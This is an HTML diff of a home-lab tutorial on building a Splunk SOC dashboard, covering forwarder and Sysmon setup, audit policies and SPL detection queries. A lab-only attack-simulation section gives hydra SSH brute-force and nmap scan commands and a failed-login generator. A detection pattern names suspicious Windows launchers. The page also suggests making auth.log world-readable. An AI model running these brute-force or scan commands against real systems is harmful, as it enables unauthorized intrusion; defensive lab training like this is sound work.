+<span class="c-green">sudo dpkg -i</span> splunkforwarder-9.x.x-linux-amd64.deb
+
+<span class="c-dim"># Start and configure admin credentials</span>
+<span class="c-green">sudo /opt/splunkforwarder/bin/splunk start</span> <span class="c-cyan">--accept-license \
+  --answer-yes --no-prompt</span>
+
+<span class="c-dim"># Enable auto-start on boot</span>
+<span class="c-green">sudo /opt/splunkforwarder/bin/splunk enable boot-start</span></pre>
+        </div>
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 2.2: Connect to Splunk Indexer">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">2.2</span>
+        <h3>Point the Forwarder to Splunk Indexer</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Configure the forwarder to send all collected data to your Splunk Enterprise indexer 
+          at port 9997. Replace <code>SPLUNK_IP</code> with the actual IP of your Splunk server.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Add the Splunk indexer as a forwarding target</span>
+<span class="c-green">sudo /opt/splunkforwarder/bin/splunk add forward-server</span> \
+  <span class="c-yellow">SPLUNK_IP:9997</span> \
+  <span class="c-cyan">-auth admin:YourSecurePass123!</span>
+
+<span class="c-dim"># Verify the connection</span>
+<span class="c-green">sudo /opt/splunkforwarder/bin/splunk list forward-server</span> \
+  <span class="c-cyan">-auth admin:YourSecurePass123!</span></pre>
+        </div>
+        <div class="info-box tip">
+          <span class="info-icon">✓</span>
+          <div>You should see <code>Active forwards: SPLUNK_IP:9997</code> in the output. If connection fails, verify firewall rules on both VMs and confirm port 9997 is open.</div>
+        </div>
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 2.3: Configure Log Inputs">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">2.3</span>
+        <h3>Configure Log Inputs (inputs.conf)</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Configure which log files the forwarder monitors. Create a custom <code>inputs.conf</code> 
+          that monitors the most important Linux security logs. This is the most critical configuration file for your Ubuntu endpoint.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — create inputs.conf</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-green">sudo nano</span> /opt/splunkforwarder/etc/system/local/inputs.conf</pre>
+        </div>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">ini — inputs.conf content</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Authentication log - SSH logins, sudo, failed auth</span>
+<span class="c-cyan">[monitor:///var/log/auth.log]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = linux_logs
+<span class="c-green">sourcetype</span> = linux_secure
+<span class="c-green">host_segment</span> = 3
+
+<span class="c-dim"># Syslog - kernel messages, system events</span>
+<span class="c-cyan">[monitor:///var/log/syslog]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = linux_logs
+<span class="c-green">sourcetype</span> = syslog
+
+<span class="c-dim"># UFW firewall logs - blocked/allowed connections</span>
+<span class="c-cyan">[monitor:///var/log/ufw.log]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = linux_logs
+<span class="c-green">sourcetype</span> = linux_ufw
+
+<span class="c-dim"># Kernel log</span>
+<span class="c-cyan">[monitor:///var/log/kern.log]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = linux_logs
+<span class="c-green">sourcetype</span> = linux_kern
+
+<span class="c-dim"># Apache/Nginx access logs (if web server installed)</span>
+<span class="c-cyan">[monitor:///var/log/apache2/access.log]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = linux_logs
+<span class="c-green">sourcetype</span> = access_combined</pre>
+        </div>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — restart forwarder</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-green">sudo /opt/splunkforwarder/bin/splunk restart</span></pre>
+        </div>
+
+        <div class="info-box warning">
+          <span class="info-icon">⚠</span>
+          <div>The forwarder runs as root to access restricted log files. Ensure the <code>splunk</code> user has read access: <code>sudo chmod o+r /var/log/auth.log</code> or run the forwarder as root.</div>
+        </div>
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 2.4: Enable UFW and Auditd">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">2.4</span>
+        <h3>Enable UFW Firewall &amp; Auditd for Richer Logs</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Enable and configure UFW (firewall) and auditd (Linux audit daemon) to generate 
+          richer security telemetry that makes your Splunk dashboard more interesting.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — UFW setup</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Enable UFW with logging</span>
+<span class="c-green">sudo ufw enable</span>
+<span class="c-green">sudo ufw logging on</span>
+<span class="c-green">sudo ufw allow</span> <span class="c-orange">22</span>/tcp   <span class="c-dim"># Allow SSH</span>
+<span class="c-green">sudo ufw allow</span> <span class="c-orange">80</span>/tcp   <span class="c-dim"># Allow HTTP (for attack simulation)</span>
+<span class="c-green">sudo ufw status verbose</span>
+
+<span class="c-dim"># Install and configure auditd</span>
+<span class="c-green">sudo apt install</span> auditd audispd-plugins <span class="c-cyan">-y</span>
+<span class="c-green">sudo systemctl enable auditd</span>
+<span class="c-green">sudo systemctl start auditd</span>
+
+<span class="c-dim"># Add useful audit rules</span>
+<span class="c-green">sudo auditctl -w</span> /etc/passwd <span class="c-cyan">-p wa -k</span> passwd_changes
+<span class="c-green">sudo auditctl -w</span> /etc/shadow <span class="c-cyan">-p wa -k</span> shadow_changes
+<span class="c-green">sudo auditctl -w</span> /bin/su <span class="c-cyan">-p x -k</span> priv_esc
+<span class="c-green">sudo auditctl -w</span> /usr/bin/sudo <span class="c-cyan">-p x -k</span> sudo_use</pre>
+        </div>
+      </div>
+    </article>
+
+  </div>
+</section>
+
+<!-- ===== PHASE 3 ===== -->
+<section class="phase" id="phase3" aria-labelledby="phase3-title">
+  <div class="phase-header">
+    <div class="phase-number" aria-hidden="true">03</div>
+    <div class="phase-title-group">
+      <h2 id="phase3-title">Windows Server — Universal Forwarder &amp; Sysmon</h2>
+      <div class="phase-tag">Endpoint Configuration · Windows Server 2019/2022</div>
+    </div>
+    <span class="phase-status required" aria-label="Required step">Required</span>
+  </div>
+
+  <div class="steps">
+
+    <article class="step open" aria-label="Step 3.1: Install Sysmon">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="true">
+        <span class="step-num">3.1</span>
+        <h3>Install Sysmon for Enhanced Windows Telemetry</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Sysmon (System Monitor) dramatically improves Windows visibility by logging process creation, 
+          network connections, file operations, and more. Use the SwiftOnSecurity config — the gold standard for lab environments.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">powershell — run as Administrator</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Download Sysmon from Microsoft Sysinternals</span>
+<span class="c-green">Invoke-WebRequest</span> <span class="c-cyan">-Uri</span> <span class="c-yellow">"https://download.sysinternals.com/files/Sysmon.zip"</span> <span class="c-cyan">-OutFile</span> <span class="c-yellow">"C:\Tools\Sysmon.zip"</span>
+<span class="c-green">Expand-Archive</span> <span class="c-cyan">-Path</span> <span class="c-yellow">"C:\Tools\Sysmon.zip"</span> <span class="c-cyan">-DestinationPath</span> <span class="c-yellow">"C:\Tools\Sysmon"</span>
+
+<span class="c-dim"># Download SwiftOnSecurity Sysmon config (recommended baseline)</span>
+<span class="c-green">Invoke-WebRequest</span> <span class="c-cyan">-Uri</span> <span class="c-yellow">"https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml"</span> <span class="c-cyan">-OutFile</span> <span class="c-yellow">"C:\Tools\sysmonconfig.xml"</span>
+
+<span class="c-dim"># Install Sysmon with the config</span>
+<span class="c-green">C:\Tools\Sysmon\Sysmon64.exe</span> <span class="c-cyan">-accepteula -i</span> C:\Tools\sysmonconfig.xml
+
+<span class="c-dim"># Verify Sysmon is running</span>
+<span class="c-green">Get-Service</span> Sysmon64 | <span class="c-green">Select-Object</span> Status, DisplayName</pre>
+        </div>
+        <div class="info-box tip">
+          <span class="info-icon">✓</span>
+          <div>Sysmon events appear in <strong>Windows Event Log → Applications and Services Logs → Microsoft → Windows → Sysmon</strong>. Event ID 1 = Process Create, Event ID 3 = Network Connection, Event ID 11 = File Create.</div>
+        </div>
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 3.2: Install Universal Forwarder on Windows">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">3.2</span>
+        <h3>Install Splunk Universal Forwarder on Windows Server</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Download and install the Windows Universal Forwarder MSI. The installer allows you to configure 
+          the receiving indexer address directly during setup.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">powershell — silent MSI install</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Download the Windows UF installer</span>
+<span class="c-green">Invoke-WebRequest</span> <span class="c-cyan">-Uri</span> <span class="c-yellow">"https://download.splunk.com/products/universalforwarder/releases/9.x.x/windows/splunkforwarder-9.x.x-x64-release.msi"</span> <span class="c-cyan">-OutFile</span> <span class="c-yellow">"C:\Tools\splunkforwarder.msi"</span>
+
+<span class="c-dim"># Silent installation with indexer pointing to Splunk server</span>
+<span class="c-green">msiexec.exe /i</span> C:\Tools\splunkforwarder.msi <span class="c-cyan">RECEIVING_INDEXER="SPLUNK_IP:9997"</span> <span class="c-cyan">AGREETOLICENSE=Yes</span> <span class="c-cyan">SPLUNKUSERNAME=admin</span> <span class="c-cyan">SPLUNKPASSWORD=YourSecurePass123!</span> <span class="c-cyan">/quiet</span>
+
+<span class="c-dim"># Add forward server (if not set during install)</span>
+<span class="c-green">&amp; "C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe"</span> add forward-server SPLUNK_IP:9997 <span class="c-cyan">-auth admin:YourSecurePass123!</span></pre>
+        </div>
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 3.3: Configure Windows inputs.conf">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">3.3</span>
+        <h3>Configure Windows Event Log Inputs</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Create an <code>inputs.conf</code> to collect Windows Event Logs, Sysmon events, and PowerShell logs. 
+          This is the core of Windows endpoint visibility.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">powershell — open inputs.conf</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-green">notepad</span> <span class="c-yellow">"C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"</span></pre>
+        </div>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">ini — inputs.conf content</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Security Event Log - logins, account changes, audit policy</span>
+<span class="c-cyan">[WinEventLog://Security]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = windows_logs
+<span class="c-green">sourcetype</span> = WinEventLog:Security
+<span class="c-green">renderXml</span> = false
+<span class="c-green">evt_resolve_ad_obj</span> = 1
+
+<span class="c-dim"># System Event Log</span>
+<span class="c-cyan">[WinEventLog://System]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = windows_logs
+<span class="c-green">sourcetype</span> = WinEventLog:System
+
+<span class="c-dim"># Application Event Log</span>
+<span class="c-cyan">[WinEventLog://Application]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = windows_logs
+<span class="c-green">sourcetype</span> = WinEventLog:Application
+
+<span class="c-dim"># Sysmon operational log</span>
+<span class="c-cyan">[WinEventLog://Microsoft-Windows-Sysmon/Operational]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = windows_logs
+<span class="c-green">sourcetype</span> = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+<span class="c-green">renderXml</span> = true
+
+<span class="c-dim"># PowerShell Operational log</span>
+<span class="c-cyan">[WinEventLog://Microsoft-Windows-PowerShell/Operational]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = windows_logs
+<span class="c-green">sourcetype</span> = WinEventLog:PowerShell
+
+<span class="c-dim"># DNS Client Events</span>
+<span class="c-cyan">[WinEventLog://Microsoft-Windows-DNS-Client/Operational]</span>
+<span class="c-green">disabled</span> = false
+<span class="c-green">index</span> = windows_logs</pre>
+        </div>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">powershell — restart forwarder</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-green">Restart-Service</span> SplunkForwarder
+<span class="c-green">Get-Service</span> SplunkForwarder | <span class="c-green">Select-Object</span> Status, DisplayName</pre>
+        </div>
+        <div class="info-box note">
+          <span class="info-icon">ℹ</span>
+          <div>Key Windows Security Event IDs to know: <strong>4624</strong> (Logon), <strong>4625</strong> (Failed Logon), <strong>4648</strong> (Logon with explicit creds), <strong>4720</strong> (Account created), <strong>4740</strong> (Account locked out), <strong>4688</strong> (Process created).</div>
+        </div>
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 3.4: Enable Advanced Audit Policy">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">3.4</span>
+        <h3>Enable Windows Advanced Audit Policy</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Windows default audit policy generates minimal logs. Enable advanced auditing to capture 
+          the events that matter most for security monitoring.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">powershell — enable audit policies</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Enable comprehensive audit policies</span>
+<span class="c-green">auditpol /set /category:"Account Logon"</span> /success:enable /failure:enable
+<span class="c-green">auditpol /set /category:"Logon/Logoff"</span> /success:enable /failure:enable
+<span class="c-green">auditpol /set /category:"Account Management"</span> /success:enable /failure:enable
+<span class="c-green">auditpol /set /category:"Privilege Use"</span> /success:enable /failure:enable
+<span class="c-green">auditpol /set /category:"Detailed Tracking"</span> /success:enable /failure:enable
+<span class="c-green">auditpol /set /category:"Object Access"</span> /success:enable /failure:enable
+<span class="c-green">auditpol /set /category:"System"</span> /success:enable /failure:enable
+
+<span class="c-dim"># Enable PowerShell Script Block Logging (critical for PS attacks)</span>
+<span class="c-green">reg add</span> <span class="c-yellow">"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"</span> <span class="c-cyan">/v EnableScriptBlockLogging /t REG_DWORD /d 1 /f</span>
+
+<span class="c-dim"># Verify policies are set</span>
+<span class="c-green">auditpol /get /category:*</span></pre>
+        </div>
+      </div>
+    </article>
+
+  </div>
+</section>
+
+<!-- ===== PHASE 4 ===== -->
+<section class="phase" id="phase4" aria-labelledby="phase4-title">
+  <div class="phase-header">
+    <div class="phase-number" aria-hidden="true">04</div>
+    <div class="phase-title-group">
+      <h2 id="phase4-title">Splunk Dashboard — SOC Command Center</h2>
+      <div class="phase-tag">SPL Queries · Dashboard Studio · Real-time Panels</div>
+    </div>
+    <span class="phase-status required" aria-label="Required step">Required</span>
+  </div>
+
+  <div class="steps">
+
+    <article class="step open" aria-label="Step 4.1: Core SPL Queries">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="true">
+        <span class="step-num">4.1</span>
+        <h3>Core SPL Queries for Your Dashboard Panels</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          These SPL (Splunk Processing Language) queries form the backbone of your SOC dashboard. 
+          Each query powers a specific panel visualizing a different aspect of your environment.
+        </p>
+
+        <div class="mini-card" style="margin-bottom:16px;">
+          <div class="mini-card-title">Panel 1 — Failed Login Attempts (Brute Force Detection)</div>
+          <div class="code-block" style="margin-top:10px;">
+            <div class="code-header">
+              <span class="code-lang">spl</span>
+              <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy SPL query">COPY</button>
+            </div>
+            <pre><span class="spl-keyword">index</span>=linux_logs <span class="spl-field">sourcetype</span>=linux_secure 
+  (<span class="spl-string">"Failed password"</span> OR <span class="spl-string">"authentication failure"</span> OR <span class="spl-string">"Invalid user"</span>)
+<span class="spl-pipe">|</span> <span class="spl-keyword">rex</span> <span class="spl-string">"from (?P&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+)"</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">stats</span> <span class="spl-func">count</span> <span class="spl-keyword">as</span> failures <span class="spl-keyword">by</span> src_ip
+<span class="spl-pipe">|</span> <span class="spl-keyword">sort</span> <span class="spl-func">-failures</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">head</span> 20
+<span class="spl-pipe">|</span> <span class="spl-keyword">eval</span> severity=<span class="spl-keyword">case</span>(failures>=100,<span class="spl-string">"CRITICAL"</span>,failures>=50,<span class="spl-string">"HIGH"</span>,failures>=10,<span class="spl-string">"MEDIUM"</span>,<span class="spl-string">true()</span>,<span class="spl-string">"LOW"</span>)</pre>
+          </div>
+        </div>
+
+        <div class="mini-card" style="margin-bottom:16px;">
+          <div class="mini-card-title">Panel 2 — Windows Failed Logins by User</div>
+          <div class="code-block" style="margin-top:10px;">
+            <div class="code-header">
+              <span class="code-lang">spl</span>
+              <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy SPL query">COPY</button>
+            </div>
+            <pre><span class="spl-keyword">index</span>=windows_logs <span class="spl-field">sourcetype</span>=WinEventLog:Security 
+  <span class="spl-field">EventCode</span>=4625
+<span class="spl-pipe">|</span> <span class="spl-keyword">stats</span> <span class="spl-func">count</span> <span class="spl-keyword">as</span> failed_logins <span class="spl-keyword">by</span> Account_Name, IpAddress
+<span class="spl-pipe">|</span> <span class="spl-keyword">where</span> failed_logins > 3
+<span class="spl-pipe">|</span> <span class="spl-keyword">sort</span> <span class="spl-func">-failed_logins</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">rename</span> Account_Name <span class="spl-keyword">as</span> <span class="spl-string">"Target User"</span>, IpAddress <span class="spl-keyword">as</span> <span class="spl-string">"Source IP"</span>, failed_logins <span class="spl-keyword">as</span> <span class="spl-string">"Failed Attempts"</span></pre>
+          </div>
+        </div>
+
+        <div class="mini-card" style="margin-bottom:16px;">
+          <div class="mini-card-title">Panel 3 — Real-time Event Count by Host (Timechart)</div>
+          <div class="code-block" style="margin-top:10px;">
+            <div class="code-header">
+              <span class="code-lang">spl</span>
+              <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy SPL query">COPY</button>
+            </div>
+            <pre><span class="spl-keyword">index</span>=(linux_logs OR windows_logs)
+<span class="spl-pipe">|</span> <span class="spl-keyword">timechart</span> <span class="spl-func">count</span> <span class="spl-keyword">by</span> host span=5m
+<span class="spl-pipe">|</span> <span class="spl-keyword">fillnull</span> value=0</pre>
+          </div>
+        </div>
+
+        <div class="mini-card" style="margin-bottom:16px;">
+          <div class="mini-card-title">Panel 4 — Sysmon Network Connections (Outbound)</div>
+          <div class="code-block" style="margin-top:10px;">
+            <div class="code-header">
+              <span class="code-lang">spl</span>
+              <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy SPL query">COPY</button>
+            </div>
+            <pre><span class="spl-keyword">index</span>=windows_logs <span class="spl-field">sourcetype</span>=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational 
+  <span class="spl-field">EventCode</span>=3
+<span class="spl-pipe">|</span> <span class="spl-keyword">spath</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">stats</span> <span class="spl-func">count</span> <span class="spl-keyword">by</span> Image, DestinationIp, DestinationPort
+<span class="spl-pipe">|</span> <span class="spl-keyword">sort</span> <span class="spl-func">-count</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">head</span> 25</pre>
+          </div>
+        </div>
+
+        <div class="mini-card" style="margin-bottom:16px;">
+          <div class="mini-card-title">Panel 5 — UFW Firewall Block Events (Geo)</div>
+          <div class="code-block" style="margin-top:10px;">
+            <div class="code-header">
+              <span class="code-lang">spl</span>
+              <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy SPL query">COPY</button>
+            </div>
+            <pre><span class="spl-keyword">index</span>=linux_logs <span class="spl-field">sourcetype</span>=linux_ufw <span class="spl-string">"[UFW BLOCK]"</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">rex</span> <span class="spl-string">"SRC=(?P&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+) DST=(?P&lt;dst_ip&gt;\d+\.\d+\.\d+\.\d+).*DPT=(?P&lt;dst_port&gt;\d+)"</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">iplocation</span> src_ip
+<span class="spl-pipe">|</span> <span class="spl-keyword">stats</span> <span class="spl-func">count</span> <span class="spl-keyword">as</span> blocked <span class="spl-keyword">by</span> src_ip, Country, dst_port
+<span class="spl-pipe">|</span> <span class="spl-keyword">sort</span> <span class="spl-func">-blocked</span></pre>
+          </div>
+        </div>
+
+        <div class="mini-card">
+          <div class="mini-card-title">Panel 6 — New Processes Created (Sysmon EventID 1)</div>
+          <div class="code-block" style="margin-top:10px;">
+            <div class="code-header">
+              <span class="code-lang">spl</span>
+              <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy SPL query">COPY</button>
+            </div>
+            <pre><span class="spl-keyword">index</span>=windows_logs <span class="spl-field">sourcetype</span>=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational 
+  <span class="spl-field">EventCode</span>=1
+<span class="spl-pipe">|</span> <span class="spl-keyword">spath</span>
+<span class="spl-pipe">|</span> <span class="spl-keyword">eval</span> suspicious=<span class="spl-keyword">if</span>(<span class="spl-func">match</span>(CommandLine,<span class="spl-string">"(powershell.*-enc|cmd.*\/c|wscript|cscript|mshta|regsvr32|rundll32)"</span>),<span class="spl-string">"YES"</span>,<span class="spl-string">"NO"</span>)
+<span class="spl-pipe">|</span> <span class="spl-keyword">table</span> _time, Image, CommandLine, User, ParentImage, suspicious
+<span class="spl-pipe">|</span> <span class="spl-keyword">sort</span> <span class="spl-func">-_time</span></pre>
+          </div>
+        </div>
+
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 4.2: Build the Dashboard">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">4.2</span>
+        <h3>Create the SOC Dashboard in Splunk</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">Follow these steps in the Splunk Web UI to build your dashboard.</p>
+        <ul class="checklist" aria-label="Dashboard creation steps">
+          <li>Go to <strong>Search &amp; Reporting</strong> → <strong>Dashboards</strong> → <strong>Create New Dashboard</strong></li>
+          <li>Name it <strong>"SOC Operations Center"</strong>, select Classic Dashboards or Dashboard Studio</li>
+          <li>Click <strong>Edit</strong> → <strong>Add Panel</strong> for each query above</li>
+          <li>Choose visualization type: Table (logins), Line Chart (timechart), Pie Chart (source types), Bar Chart (top attackers)</li>
+          <li>Set <strong>Refresh Interval</strong> to <strong>30 seconds</strong> for real-time feel</li>
+          <li>Use <strong>Time Picker</strong> token to make all panels use the same time range</li>
+          <li>Add a <strong>Single Value</strong> panel for "Total Events Last Hour" with a threshold color</li>
+          <li>Save and set permissions to <strong>Shared in App</strong></li>
+        </ul>
+        <div class="info-box tip">
+          <span class="info-icon">✓</span>
+          <div><strong>Pro tip:</strong> Use Dashboard Studio (the newer editor) for a cleaner, more modern look. You can drag-resize panels and use the "Absolute" layout for pixel-perfect placement.</div>
+        </div>
+      </div>
+    </article>
+
+  </div>
+</section>
+
+<!-- ===== PHASE 5 ===== -->
+<section class="phase" id="phase5" aria-labelledby="phase5-title">
+  <div class="phase-header">
+    <div class="phase-number" aria-hidden="true">05</div>
+    <div class="phase-title-group">
+      <h2 id="phase5-title">Attack Simulation — Generate Visible Security Events</h2>
+      <div class="phase-tag">Red Team · Safe Lab Simulations · Dashboard Validation</div>
+    </div>
+    <span class="phase-status important" aria-label="Important step">Important</span>
+  </div>
+
+  <div class="info-box danger" style="margin-bottom:24px;">
+    <span class="info-icon">🔒</span>
+    <div><strong>Lab Only:</strong> Run these simulations ONLY within your isolated VMware lab environment. Never perform these actions against systems you don't own or have explicit written permission to test.</div>
+  </div>
+
+  <div class="steps">
+
+    <article class="attack-card" aria-label="Attack 1: SSH Brute Force">
+      <div class="attack-header">
+        <div class="attack-title">🔓 SSH Brute Force Attack (Linux Target)</div>
+        <span class="attack-severity sev-high" aria-label="High severity">HIGH</span>
+      </div>
+      <p class="attack-desc">Simulates a dictionary-based brute force attack against SSH. Generates Failed Password events in auth.log, visible in your linux_logs index.</p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash — from attacker machine</span>
+          <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+        </div>
+        <pre><span class="c-dim"># Install hydra (brute force tool)</span>
+<span class="c-green">sudo apt install</span> hydra <span class="c-cyan">-y</span>
+
+<span class="c-dim"># Brute force SSH with rockyou wordlist (on Ubuntu VM target)</span>
+<span class="c-green">hydra -l</span> root <span class="c-cyan">-P</span> /usr/share/wordlists/rockyou.txt <span class="c-orange">ssh://UBUNTU_VM_IP</span> <span class="c-cyan">-t 4 -w 3</span>
+
+<span class="c-dim"># Also try multiple usernames</span>
+<span class="c-green">hydra -L</span> /usr/share/wordlists/metasploit/unix_users.txt <span class="c-cyan">-P</span> /usr/share/wordlists/rockyou.txt <span class="c-orange">ssh://UBUNTU_VM_IP</span> <span class="c-cyan">-t 4</span>
+
+<span class="c-dim"># Verify in Splunk: index=linux_logs "Failed password" | stats count by src</span></pre>
+      </div>
+    </article>
+
+    <article class="attack-card" aria-label="Attack 2: Port Scan">
+      <div class="attack-header">
+        <div class="attack-title">🔍 Network Port Scan (Reconnaissance)</div>
+        <span class="attack-severity sev-medium" aria-label="Medium severity">MEDIUM</span>
+      </div>
+      <p class="attack-desc">Simulates attacker reconnaissance. Generates UFW block events and Sysmon network connection events visible on the dashboard.</p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash — nmap scans</span>
+          <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+        </div>
+        <pre><span class="c-dim"># Install nmap</span>
+<span class="c-green">sudo apt install</span> nmap <span class="c-cyan">-y</span>
+
+<span class="c-dim"># SYN scan against Ubuntu VM (generates firewall logs)</span>
+<span class="c-green">sudo nmap -sS -p-</span> UBUNTU_VM_IP
+
+<span class="c-dim"># Service version detection scan</span>
+<span class="c-green">nmap -sV -sC</span> WINDOWS_SERVER_IP
+
+<span class="c-dim"># Aggressive scan (OS detection, scripts)</span>
+<span class="c-green">sudo nmap -A</span> UBUNTU_VM_IP
+
+<span class="c-dim"># Verify in Splunk: index=linux_logs sourcetype=linux_ufw "[UFW BLOCK]" | stats count by src_ip</span></pre>
+      </div>
+    </article>
+
+    <article class="attack-card" aria-label="Attack 3: Windows Failed Logins">
+      <div class="attack-header">
+        <div class="attack-title">🪟 Windows Failed Authentication Events</div>
+        <span class="attack-severity sev-high" aria-label="High severity">HIGH</span>
+      </div>
+      <p class="attack-desc">Generate Windows Security Event ID 4625 (Failed Login) events visible in your windows_logs index.</p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">powershell — on Windows Server</span>
+          <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+        </div>
+        <pre><span class="c-dim"># Script to generate multiple failed login attempts</span>
+<span class="c-green">$cred</span> = <span class="c-cyan">New-Object</span> System.Management.Automation.PSCredential(<span class="c-yellow">"FakeAdmin"</span>, (<span class="c-yellow">"WrongPass123"</span> | <span class="c-green">ConvertTo-SecureString -AsPlainText -Force</span>))
+<span class="c-cyan">1..20</span> | <span class="c-green">ForEach-Object</span> {
+    <span class="c-green">Start-Process</span> cmd <span class="c-cyan">-Credential</span> $cred <span class="c-cyan">-ErrorAction SilentlyContinue</span>
+    <span class="c-green">Start-Sleep</span> <span class="c-cyan">-Milliseconds</span> 500
+}
+
+<span class="c-dim"># Verify: index=windows_logs EventCode=4625 | stats count by Account_Name</span>
+
+<span class="c-dim"># Also trigger account lockout (Event 4740)</span>
